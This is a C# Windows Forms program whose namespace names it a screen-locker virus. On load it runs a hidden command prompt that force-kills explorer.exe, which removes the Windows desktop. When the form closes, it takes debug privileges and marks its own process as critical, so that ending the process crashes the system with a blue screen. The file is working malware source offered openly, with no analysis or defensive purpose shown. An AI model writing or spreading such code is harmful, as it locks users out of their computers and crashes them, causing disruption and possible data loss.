using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 锁机病毒
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // 创建一个新的线程并开始执行
            Thread thread = new Thread(new ThreadStart(WorkerThread));
            thread.Start();

            //杀死explorer
            Process process_CMD = new Process();
            process_CMD.StartInfo.FileName = "cmd.exe";//进程打开文件名为“cmd”
            process_CMD.StartInfo.RedirectStandardInput = true;//是否可以输入
            process_CMD.StartInfo.RedirectStandardOutput = true;//是否可以输出
            process_CMD.StartInfo.CreateNoWindow = true;//不创建窗体 也就是隐藏窗体
            process_CMD.StartInfo.UseShellExecute = false;//是否使用系统shell执行，否

            process_CMD.Start();

            process_CMD.StandardInput.WriteLine("taskkill /im explorer.exe /t /f ");


        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void WorkerThread()
        {
            for (int i = 0; i < 100; i++)
            {
                Thread.Sleep(1000);
                progressBar1.Value = i;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //关闭窗体触发蓝屏
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
    }
}
